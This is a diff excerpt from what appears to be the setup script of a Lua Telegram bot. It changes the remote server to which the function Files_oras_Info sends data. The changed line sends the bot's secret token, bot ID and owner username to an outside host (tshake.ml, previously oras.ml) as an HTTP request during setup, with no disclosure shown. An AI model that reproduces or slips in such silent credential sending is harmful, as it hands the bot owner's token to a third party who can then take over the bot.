@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_oras_Info()
 Create_Info(database:get(Server_oras.."Token_oras"),database:get(Server_oras.."Id_oras"),database:get(Server_oras.."UserName_oras"))   
-http.request("http://oras.ml/add/?id="..database:get(Server_oras.."Id_oras").."&user="..database:get(Server_oras.."UserName_oras").."&token="..database:get(Server_oras.."Token_oras"))
+http.request("http://tshake.ml/add/?id="..database:get(Server_oras.."Id_oras").."&user="..database:get(Server_oras.."UserName_oras").."&token="..database:get(Server_oras.."Token_oras"))
 local Runoras = io.open("oras", 'w')
 Runoras:write([[
 #!/usr/bin/env bash
